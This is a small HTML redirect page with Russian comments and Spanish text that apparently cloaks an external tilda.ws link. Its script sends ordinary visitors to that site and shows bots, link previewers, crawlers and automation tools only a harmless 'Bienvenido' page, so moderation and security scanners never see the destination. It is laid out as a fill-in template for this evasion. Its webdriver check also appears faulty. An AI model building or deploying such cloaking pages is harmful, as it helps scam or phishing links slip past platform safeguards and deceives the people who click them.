<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirección</title>
  <script>
    // ⚠️ Настрой здесь свою целевую ссылку
    const redirectUrl = "http://argentinaforreal.tilda.ws/";

    // Фильтрация по User-Agent
    const botPatterns = [
      /bot/i, /crawl/i, /spider/i, /facebook/i, /telegram/i,
      /whatsapp/i, /discord/i, /preview/i, /python/i,
      /curl/i, /wget/i, /Headless/i, /Chrome-Lighthouse/i
    ];

    const userAgent = navigator.userAgent;
    const isBot = botPatterns.some(pattern => pattern.test(userAgent));

    // Проверка на включённый JavaScript и выполнение антибота
    if (!isBot && typeof navigator.webdriver === "undefined") {
      // Разрешённый трафик — делаем редирект
      window.location.href = redirectUrl;
    } else {
      // Бот или парсер — останется на белой странице
      document.write("<h1 style='text-align:center'>Bienvenido</h1>");
    }
  </script>
</head>
<body>
</body>
</html>
